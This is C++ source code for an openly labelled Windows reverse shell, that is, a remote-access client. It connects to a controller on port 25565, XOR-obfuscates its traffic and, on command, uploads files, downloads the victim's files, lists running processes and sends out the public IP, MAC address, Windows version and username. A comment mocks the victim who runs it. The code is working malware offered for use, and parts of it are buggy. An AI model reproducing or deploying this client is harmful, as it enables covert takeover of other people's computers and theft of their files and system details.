/*
author: @Reycecar
Windows reverse shell

Compile instructions:
g++.exe -fdiagnostics-color=always -g client.cpp -o client.exe -lwsock32 -lrpcrt4 -lWs2_32 -lwininet -liphlpapi -lurlmon -fpermissive
*/

#define WIN32_LEAN_AND_MEAN
#include <iostream>
#include <fstream>
#include <sstream>
#include <cstring>
#include <vector>
#include <string>
#include <iomanip>
#include <algorithm>
#include <filesystem>
#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#include <stdio.h>
#include <tlhelp32.h>
#include <Lmcons.h>
#include <wininet.h>
#include <winsock.h>
#include <iptypes.h>
#include <psapi.h>
#include <iphlpapi.h>
#include <string.h>
#include <rpc.h>
#pragma comment(lib, "Ws2_32.lib")
#pragma comment(lib, "Wininet.lib")
#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "Rpcrt4.lib")

#define SERV_PORT "25565" //Default port for Minecraft Java
#define SERV_ADDR "127.0.0.1"
#define DEFAULT_BUFLEN 1024
using namespace std;

// used to encrypt/decrypt data
char* xor_func(char msg[]) {
	for (int i = 0; i < strlen(msg); i++) {
		if (msg[i] != '\0' && msg[i] != '+') {
			msg[i] ^= '+'; // XOR each character with '+'
		}
		
	}
	return msg; // return XORd character array
}

// get the username of the user foolish enough to run this godforsaken program
std::string getUsername() {
	DWORD bufferSize = 0; // initialize var bufferSize
	GetUserNameA(NULL, &bufferSize); // GetUserNameA function w/ NULL buffer to get buffer size
	if (bufferSize == 0) {
		return ""; // If username space is 0 return emptystring
	}
	char* buffer = new char[bufferSize]; //allocate mem for buffer
	if (GetUserNameA(buffer, &bufferSize)) { // If GetUserNameA call is successful...
		std::string username(buffer); // create string from the buffer
		delete[] buffer; // free mem
		return username; // return username as string
	}
	delete[] buffer; // free mem
	return "";
}

std::string getMACs() {
	std::string mac; // initialize var mac for mac addr
	ULONG size = 0; // initialize size for buffer

	// Get the network adapter information
	if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, NULL, &size) != ERROR_BUFFER_OVERFLOW) {
		return ""; // if buffer overflow: ret blank
	}
	// Allocate mem for adapter addresses buffer
	PIP_ADAPTER_ADDRESSES adapterAddresses = (PIP_ADAPTER_ADDRESSES)malloc(size);
	if (adapterAddresses == NULL) {
		return ""; // if not adapter addresses: ret blank
	}
	// Get the network adapter information but w/ the buffer
	if (GetAdaptersAddresses(AF_UNSPEC, GAA_FLAG_INCLUDE_PREFIX, NULL, adapterAddresses, &size) != NO_ERROR) {
		free(adapterAddresses);
		return ""; // if errors occur: ret blank
	}

	// Iterate over the network adapters and find the MAC address
	PIP_ADAPTER_ADDRESSES adapter = adapterAddresses;
	while (adapter != NULL) {
		if (adapter->PhysicalAddressLength > 0) {
			char macBuff[18]; // Initialize macBuffer to hold the formatted MAC addr
			// format mac into string
			sprintf_s(macBuff, sizeof(macBuff), "%02X:%02X:%02X:%02X:%02X:%02X",
				adapter->PhysicalAddress[0], adapter->PhysicalAddress[1], adapter->PhysicalAddress[2],
				adapter->PhysicalAddress[3], adapter->PhysicalAddress[4], adapter->PhysicalAddress[5]);
			mac = macBuff;
			break; //exit loop after getting mac
		}
		adapter = adapter->Next; // go to next adapter
	}

	// Clean up, Clean Up, Everybody Do your share! free mem
	free(adapterAddresses);
	return mac;
}

// Helper function for getPublicIP()
std::string get_response_string(HANDLE hReq) {
	BOOL reqSuccess = HttpSendRequestA(hReq, NULL, NULL, NULL, NULL); // Send an HTTP req and store the success status
	if (reqSuccess) { // if HTTP req successful...
		// Initialize variables for internetReadFile
		DWORD recvData = 0;
		DWORD chunkSize = 2048; //set buffer size for reading data in chunks
		std::string buf;
		std::string chunk(chunkSize, 0);
		while (InternetReadFile(hReq, &chunk[0], chunkSize, &recvData) && recvData) {
			// Read data from the HTTP resp into the chunk buffer, and store the number of bytes read in recvData
			chunk.resize(recvData);
			buf += chunk;
		}
		//return file read buffer data
		return buf;
	}
	return nullptr;
}

// Function for getting the public facing IP address.
std::string getPublicIP() {
	HANDLE hInt = InternetOpenW(L"Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
	// Create hConnect handle for ifconfig.me
	HANDLE hConn = InternetConnectA(hInt, "ifconfig.me", 80, NULL, NULL, INTERNET_SERVICE_HTTP, NULL, NULL);
	// Pass hConnect handle into HttpOpenRequestA with request to ifconfig.me/ip
	HANDLE hReq = HttpOpenRequestA(hConn, "GET", "/ip", NULL, NULL, NULL, INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_IGNORE_CERT_CN_INVALID, NULL);
	// Helper function returns response string generated by ifconfig.me
	std::string resp = get_response_string(hReq);
	if (hReq) { // If hRequest is successful: teardown (In reverse order of creation!!!)
		InternetCloseHandle(hReq);
	}
	if (hConn) { // If hConnect is successful: teardown
		InternetCloseHandle(hConn);
	}
	return resp; // If req failed, return null pointer
}

// get a printed out list of all running processes
std::string GetProcessList()
{
	std::string processList;

    // Create a snapshot of the current processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE)
    {
        // Error: Failed to create snapshot
        processList = "Failed to create snapshot";
        return processList;
    }

    // Get information about the first process in the snapshot
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);
    if (!Process32First(hSnapshot, &pe32))
    {
        // Error: Failed to retrieve process information
        processList = "Failed to retrieve process information";
        CloseHandle(hSnapshot);
        return processList;
    }

    // Loop through all processes in the snapshot and append their names to the processList string
	char processName[260]; //WCHAR to char*
	int len; // length of process string
	char pidStr[20]; // init char* to store DWORD pid as a string
	char process[len]; //process string to append to process string list
    do {
		
		DWORD pid = pe32.th32ProcessID;
		memcpy(processName, pe32.szExeFile, 260); // copy the smaller value (either 1024 or the length of the string) into the buffer
		sprintf(pidStr, "%lu", pid); //put pid value into pidStr, padded with spaces
		len = snprintf(NULL, 0, "PID: %u | Name: %s\n", pid, processName); // determine the exact length of the process string
		
		 // create char* of process string length, no extra null bytes
		sprintf(process, "PID: %u | Name: %s\n", pid, processName);
		
		processList.append(process);
		
		//wcout << processName;// + L"\n";
    } while (Process32Next(hSnapshot, &pe32));

    // Close the snapshot handle
    CloseHandle(hSnapshot);

    return processList;
}


// get the windows os version
std::string getWinVer() {
	// Deprecated but it still works lol

	// Initialize OSVERSIONINFOEX struct
	OSVERSIONINFOEX osvi;
	ZeroMemory(&osvi, sizeof(OSVERSIONINFOEX));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO*)&osvi); // Retrieve specific version of windows w/ GetVersionEx

	// Extract the major and minor version numbers
	int majorVersion = osvi.dwMajorVersion;
	int minorVersion = osvi.dwMinorVersion;

	// Get the build number if it is available
	int buildNumber = 0;
	if (osvi.dwPlatformId == VER_PLATFORM_WIN32_NT && majorVersion >= 6) {
		ULONGLONG conditionMask = 0;
		VER_SET_CONDITION(conditionMask, VER_BUILDNUMBER, VER_GREATER_EQUAL);
		osvi.dwBuildNumber = 0;
		// Verify that the system meets the condition
		if (VerifyVersionInfo(&osvi, VER_BUILDNUMBER, conditionMask)) {
			buildNumber = osvi.dwBuildNumber;
		}
	}

	// Determine the returned string based on the operating system
	std::ostringstream oss;
	oss << "Windows ";
	switch (majorVersion) {
	case 10:
		oss << "10";
		break;
	case 6:
		switch (minorVersion) {
		case 3:
			oss << "8.1";
			break;
		case 2:
			oss << "8";
			break;
		case 1:
			oss << "7";
			break;
		case 0:
			oss << "Vista";
			break;
		}
		break;
	case 5:
		switch (minorVersion) {
		case 2:
			oss << "Server 2003";
			break;
		case 1:
			oss << "XP";
			break;
		case 0:
			oss << "2000";
			break;
		}
		break;
	}
	if (buildNumber > 0) {
		oss << " (Build " << buildNumber << ")";
	}
	return oss.str();
}

//use previous functions in information string.
std::string getSysInfo() {
	return  "PUBLIC IP:\n" + getPublicIP() + "\n\n" +
		"MAC Addresses:\n" + getMACs() + "\n\n" +
		"WINDOWS VERSION:\n" + getWinVer() + "\n\n" +
		"USERNAME:\n" + getUsername() + "\n";
}

// checks if user input is correct
// returns an int specific to case number in main()
int parseCmd(char cmd[]) {
	if (strstr(cmd, "end") != NULL) {
		return -1;
	}
	else if (strstr(cmd, "upload") != NULL) {
		return 0;
	}
	else if (strstr(cmd, "download") != NULL) {
		return 1;
	}
	else if (strstr(cmd, "processes") != NULL) {
		return 2;
	}
	else if (strstr(cmd, "systeminfo") != NULL) {
		return 3;
	}
	else {
		return -1;
	}
}

SOCKET getConnected() {
	WSADATA wsaData; // windows socket data struct
	SOCKET sock = INVALID_SOCKET; // socket handle

	//struct sockaddr_in address;
	//struct sockaddr_in server;

	struct addrinfo* result = NULL; // Pointer to addrinfo struct
	struct addrinfo hints; // addrinfo struct for hints

	char recvbuf[DEFAULT_BUFLEN]; // rcv buffer for incoming data
	int revcbuflen = DEFAULT_BUFLEN; // lenght of rcv bubber
	int connResult; // connection result

	connResult = WSAStartup(MAKEWORD(2, 2), &wsaData); // initialize winsoc
	if (connResult != 0) {
		printf("WSAStartup failed with error: %d\n", connResult);
		return 1;
	}

	ZeroMemory(&hints, sizeof(hints)); // zero out hint struct
	hints.ai_family = AF_UNSPEC; // Use AF_UNSPEC bcs localhost
	hints.ai_socktype = SOCK_STREAM; // socket type: sock stream
	hints.ai_protocol = IPPROTO_TCP; // IP protocol: TCP
	hints.ai_flags = AI_PASSIVE; // AI_PASSIVE flag indicates that the returned
								 // address is intended for use in bind() or listen() functions

	// resolve server address and port
	connResult = getaddrinfo("localhost", SERV_PORT, &hints, &result);
	if (connResult != 0) {
		printf("getaddrinfo failed: %d\n", connResult);
		WSACleanup(); // cleanup winsoc
		return 1;
	}

	// Attempt to connect to an address until one succeeds
	for (struct addrinfo* ptr = result; ptr != NULL; ptr = ptr->ai_next) {

		// Create a SOCKET for connecting to server
		sock = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);

		if (sock == INVALID_SOCKET) { // error handling
			printf("socket failed with error: %ld\n", WSAGetLastError());
			WSACleanup();
			return 1;
		}

		// Connect to server.
		connResult = connect(sock, ptr->ai_addr, (int)ptr->ai_addrlen);
		if (connResult == SOCKET_ERROR) {
			//printf("Connection failed with error: %d\n", WSAGetLastError()); // debug
			closesocket(sock);
			sock = INVALID_SOCKET;
			continue;
		}
		break; //got a connection, or none worked
	}

	freeaddrinfo(result); // free mem

	if (sock == INVALID_SOCKET) { 
		printf("Unable to connect to server!\n");
		WSACleanup();
		return 1;
	}

	return sock; // Return the connected socket handle
}

void sendMsg(std::string data, SOCKET sock) {
	char* d = const_cast<char*>(data.c_str()); // cast getData as char* so it can be xor'd and used with strlen()
	size_t msgLenCount = strlen(d);
	printf("Data length: %d\n", msgLenCount); //debug

	int msgLen = static_cast<int>(msgLenCount); // get length of message
	stringstream ss; // init stringstream to hold msgLen
	ss << std::hex << msgLen; //send message length in hex
	string msgLenStr = ss.str(); // typecast stringstream to c++ string
	char* msgLenChar = const_cast<char*>(msgLenStr.c_str()); // typecast c++ string into char*

	printf("message length content(hex): 0x%s\n", msgLenChar); // show the message length message
	xor_func(msgLenChar); // xor the message length before sending
	char lenBuf[9]; // 9 spaces for hex length int, means message length can total up to 4 gigabytes
	strcpy(lenBuf, msgLenChar); // load xor'd data into buffer
	printf("message length xor'd: %s\n", lenBuf); // show the xor encoded message length message
	printf("sending %d bytes\n\n", strlen(lenBuf));  // show how many bytes are sent with message length message
	send(sock, lenBuf, strlen(lenBuf), 0); // send data
	
	// message sending logic
	size_t i = 0; // initialize msgLen count variable
	size_t bufferLen = DEFAULT_BUFLEN; // typecast DEFAULT_BUFLEN to size_t for comparison in std::min
	char tempBuf[msgLenCount]; // make temporary buffer as large as the message
	xor_func(d); // xor the datablock
	while(i < msgLenCount) { // while count is less than the length of the message
		size_t numToCopy = std::min(bufferLen, msgLenCount - i); // return the smaller of the parameter values
		memcpy(tempBuf, d + i, numToCopy); // copy the smaller value (either 1024 or the length of the string) into the buffer
		printf("datablock: \n%.*s\n", sizeof(tempBuf),tempBuf); // show what is sent in datablock
		i += numToCopy; // increment i by number of bytes put into the buffer, next time data will start where it ended
		printf("sending %d bytes\n", numToCopy);  // show how many bytes are sent in this datablock
		send(sock, tempBuf, numToCopy, 0); // send the message (message length <= 1024 bytes)
	}
}

int main() {
	int cmd;						// var for command from server
	std::string resMsg;
	int command_packet_len;			// var for length of command packet
	char buf[DEFAULT_BUFLEN];		// var for character buffer to send data to the server
	char recvbuf[DEFAULT_BUFLEN];	// var for character buffer to rcv data to the server
	SOCKET sock;					// socket var
	sock = getConnected();			// call getConnected() function to establish connection

	printf("Connection to server successful! It's a miracle!!\n");

	while (true) {
		std::string data;					// hold info in string form
		std::wstring data2;					// hold info in wstring form
		int offset = 0;						// hold offset for parsing data
		memset(buf, 0, DEFAULT_BUFLEN);		// clear buffer
		memset(recvbuf, 0, DEFAULT_BUFLEN); // clear rcv buffer
		recv(sock, recvbuf, DEFAULT_BUFLEN, 0); //read cmd into buffer from sock

		printf("enc: %s ", recvbuf); // debug
		int cmd = parseCmd(xor_func(recvbuf)); // call parseCmd() function to parse the received command after applying xor_func() to it
		printf("dec: %s ", recvbuf); // debug
		printf("cmd int: %d \n", cmd); // debug

		switch (cmd) { //switch cases for each respecticve command sent from the server
		case -1: { //end
			printf("Shutting down\n"); //debug
			shutdown(sock, 2);
			send(sock, buf, strlen(buf), 0);
			return 0;
		} break;

		case 0: {
			printf("Upload\n"); // debug
			// get filename from server
			std::string resMsg;
			memset(recvbuf, 0, DEFAULT_BUFLEN);
			recv(sock, recvbuf, DEFAULT_BUFLEN, 0);
			char* filename = xor_func(recvbuf);
			printf("filename: %s\n", filename); // debug
			std::string filenameStr(filename, strlen(filename));

			resMsg = filenameStr + " received.\n";
			sendMsg(resMsg, sock);

			// get length of data to come
			memset(recvbuf, 0, DEFAULT_BUFLEN);
			int br = recv(sock, recvbuf, DEFAULT_BUFLEN, 0);
			char* lenCStr = xor_func(recvbuf);
			printf("lenStr: %s\n", lenCStr); // debug
			std::string lenStr(lenCStr, strlen(lenCStr));

			std::istringstream iss(lenStr);
			unsigned int dataLen = 0;
			iss >> std::hex >> dataLen; // length of data to come
			
			// handle the upload from server
			std::vector<char> databuf(DEFAULT_BUFLEN);
			
			std::ofstream file(filenameStr, std::ios::out | std::ios::binary); //Open the file
			if (!file.is_open()) {
				// download error handling
				resMsg = "1";
				sendMsg(resMsg, sock); 
			}
			while (dataLen > 0) {
				int bytesToReceive = std::min(static_cast<int>(dataLen), DEFAULT_BUFLEN);
				int bytesReceived = recv(sock, databuf.data(), bytesToReceive, 0);
				file.write(xor_func(databuf.data()), bytesReceived);
				dataLen -= bytesReceived;
			}
			file.close();
			resMsg = "File received successfully\n";
			sendMsg(resMsg, sock);
		} break;

		case 1: {
			printf("Download\n"); // debug
			// get filename from server
			memset(recvbuf, 0, DEFAULT_BUFLEN);
			recv(sock, recvbuf, DEFAULT_BUFLEN, 0);
			char* filename; // init var for filename
			
			filename = xor_func(recvbuf); // decode xor_func
			printf("filename: %s\n", filename); // debug

			// handle the download
			std::string filenameStr(filename, strlen(filename));
			std::ifstream file(filenameStr, std::ios::binary); //Open the file
			if (!file.is_open()) {
				// download error handling
				resMsg = "1";
				sendMsg(resMsg, sock);
			}

			std::string fileContents((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());

			sendMsg(fileContents, sock);
		} break;

		//new case for getRunningProcess;
		case 2: {
            printf("processes\n");
			data = GetProcessList();
			sendMsg(data, sock);
        } break;

		case 3: {
			printf("systeminfo\n");
			data = getSysInfo();
			sendMsg(data, sock);
		} break;
		}
		//free(path);
	}

}
